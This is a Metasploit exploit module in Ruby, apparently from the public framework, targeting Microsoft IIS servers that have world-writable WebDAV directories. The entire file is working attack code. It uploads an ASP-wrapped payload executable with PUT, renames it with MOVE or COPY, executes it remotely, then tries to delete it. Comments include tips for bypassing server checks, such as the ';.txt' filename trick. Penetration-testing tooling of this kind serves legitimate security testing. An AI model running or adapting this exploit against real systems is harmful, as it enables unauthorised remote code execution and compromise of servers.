##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize
    super(
      'Name'        => 'Microsoft IIS WebDAV Write Access Code Execution',
      'Description' => %q{
          This module can be used to execute a payload on IIS servers that
        have world-writeable directories. The payload is uploaded as an ASP
        script via a WebDAV PUT request.

          The target IIS machine must meet these conditions to be considered
        as exploitable: It allows 'Script resource access', Read and Write
        permission, and supports ASP.
      },
      'Author'      => 'hdm',
      'Platform'    => 'win',
      'References'  =>
        [
          ['OSVDB', '397'],
          ['BID', '12141']
        ],
      'Targets'     =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Dec 31 2004'
    )

    register_options(
      [
      # The USERNAME and PASSWORD are registered again to make them more obvious they're
      # configurable.
      OptString.new('HttpUsername',
        [false, 'The HTTP username to specify for authentication', '']),
      OptString.new('HttpPassword',
        [false, 'The HTTP password to specify for authentication', '']),
      OptString.new('PATH',
        [ true, 'The path to attempt to upload', '/metasploit%RAND%.asp']),
      OptEnum.new('METHOD',
        [ true, 'Move or copy the file on the remote system from .txt -> .asp', 'move', ['move','copy']])
      ])
  end

  def exploit
    # Generate the ASP containing the EXE containing the payload
    exe  = generate_payload_exe
    asp  = Msf::Util::EXE.to_exe_asp(exe)
    path = datastore['PATH'].gsub('%RAND%', rand(0x10000000).to_s)
    path = "/" + path if path[0] != "/"
    # Incase of "/path/to/filename.asp;.txt"
    path_tmp = "/" + File.basename(path.gsub(/\;.*/,''), ".*") + ".txt"
    path_tmp = File.dirname(path) + path_tmp if File.dirname(path) != "/"
    action = datastore['METHOD'].downcase.gsub('e','') + "ing"
    alt_method = "move"
    alt_method = "copy" if datastore['METHOD'].upcase == "MOVE"

    #
    # CHECK
    #
    print_status("Checking #{path}")
    res = send_request_cgi({
      'uri'          =>  path ,
      'method'       => 'GET',
    }, 20)

    unless res
      print_error("Connection timed out while trying to checking #{path}")
      return
    end

    if (res.code == 200)
      print_error("File #{path} already exists on the target")
      return
    end


    #
    # UPLOAD
    #
    print_status("Uploading #{asp.length} bytes to #{path_tmp}...")

    begin
      res = send_request_cgi({
        'uri'          =>  path_tmp,
        'method'       => 'PUT',
        'ctype'        => 'application/octet-stream',
        'data'         =>  asp,
      }, 20)
    rescue Errno::ECONNRESET => e
      print_error("#{e.message}. It's possible either you set the PATH option wrong, or IIS doesn't allow 'Write' permission.")
      return
    end

    unless res
      print_error("Connection timed out while uploading to #{path_tmp}")
      return
    end

    if (res.code < 200 or res.code >= 300)
      print_error("Upload failed on #{path_tmp} [#{res.code} #{res.message}]")
      return
    end

    #
    # MOVE/COPY
    #
    if (path_tmp == path)
      print_warning("Same filename for PATH and PATH_TEMP detected (#{path_tmp})")
      print_warning("Do not end PATH with '.txt'")
    else
      print_status("#{action.capitalize} #{path_tmp} to #{path}...")

      res = send_request_cgi({
          'uri'          => path_tmp,
          'method'       => datastore['METHOD'].upcase,
          'headers'      => {'Destination' => path}
      }, 20)

      unless res
        print_error("Connection timed out while moving to #{path}")
        return
      end

      if (res.code < 200 or res.code >= 300)
        print_error("#{datastore['METHOD'].capitalize} failed on #{path_tmp} [#{res.code} #{res.message}]")
        case res.code
        when 403
          print_error("IIS possibly does not allow 'READ' permission, which is required to upload executable content.")
        end
        return
      elsif (res.code == 207)
        print_warning("#{datastore['METHOD'].capitalize} may have failed. [#{res.code} Response]")
        print_warning("Try using 'set METHOD #{alt_method}' instead")
      end
    end


    #
    # EXECUTE
    #
    print_status("Executing #{path}...")

    res = send_request_cgi({
      'uri'          =>  path,
      'method'       => 'GET'
    }, 20)

    unless res
      print_error("Execution failed on #{path} [No Response]")
      return
    end

    if (res.code < 200 or res.code >= 300)
      print_error("Execution failed on #{path} [#{res.code} #{res.message}]")
      case res.message
      when 'Not Found', 'Object Not Found'
        print_error("The #{datastore['METHOD'].upcase} action failed. Possibly IIS doesn't allow 'Script Resource Access'")
        print_warning("Try using 'set METHOD #{alt_method}' instead")
        vprint_warning("Pro Tip: Try 'set PATH /metasploit%RAND%.asp;.txt' instead") unless path.include? ";"
      end
      return
    end


    #
    # DELETE
    #
    print_status("Deleting #{path} (this doesn't always work)...")

    res = send_request_cgi({
      'uri'          =>  path,
      'method'       => 'DELETE'
    }, 20)

    unless res
      print_error("Deletion failed on #{path} [No Response]")
      return
    end

    if (res.code < 200 or res.code >= 300)
      # Changed this to a warning, because red is scary and if this part fails,
      # honestly it's not that bad. In most cases this is probably expected anyway
      # because by default we're using IWAM_*, which doesn't give us a lot of
      # freedom to begin with.
      print_warning("Deletion failed on #{path} [#{res.code} #{res.message}]")
      return
    end

    handler
  end
end
